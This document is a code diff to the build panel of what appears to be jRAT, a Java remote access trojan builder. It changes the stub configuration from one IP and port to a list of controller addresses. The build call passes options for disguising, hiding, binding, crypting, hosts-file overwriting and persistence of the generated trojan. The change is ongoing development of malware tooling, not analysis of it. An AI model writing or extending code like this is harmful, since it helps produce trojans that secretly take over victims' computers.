@@ -179,8 +179,7 @@ public class PanelBuildFinal extends JPanel {
 					PanelBuildOutput out = (PanelBuildOutput) holder.panels.get("output");
 
 					String file = txtOutput.getText().trim();
-					String ip = network.getIP();
-					int port = network.getPort();
+					String[] addresses = network.getAddresses();
 					String ID = general.getID();
 					String pass = general.getPass();
 					EncryptionKey key = general.getKey();
@@ -229,7 +228,7 @@ public class PanelBuildFinal extends JPanel {
 
 					if (out.useShellcode()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
 
 						if (!file.endsWith(".jar")) {
 							file = file + ".jar";
@@ -240,7 +239,7 @@ public class PanelBuildFinal extends JPanel {
 					} else if (out.useExe()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
 
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
 
 						if (!file.toLowerCase().endsWith(".exe")) {
 							file = file + ".exe";
@@ -250,13 +249,17 @@ public class PanelBuildFinal extends JPanel {
 
 						temp.delete();
 					} else {
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), new File(file), ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), new File(file), addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
 					}
 
+					String rawAddresses = "";
+					for (String s : addresses) {
+						rawAddresses += s + ",";
+					}
+					
 					Settings.getGlobal().setVal("brecat", reconSec);
 					Settings.getGlobal().setVal("jarname", name);
-					Settings.getGlobal().setVal("bip", ip);
-					Settings.getGlobal().setVal("bport", port);
+					Settings.getGlobal().setVal("baddresses", rawAddresses); // TODO
 					Settings.getGlobal().setVal("bid", ID);
 					Settings.getGlobal().setVal("bkey", key.getTextualKey());
 					Settings.getGlobal().setVal("bpass", pass);
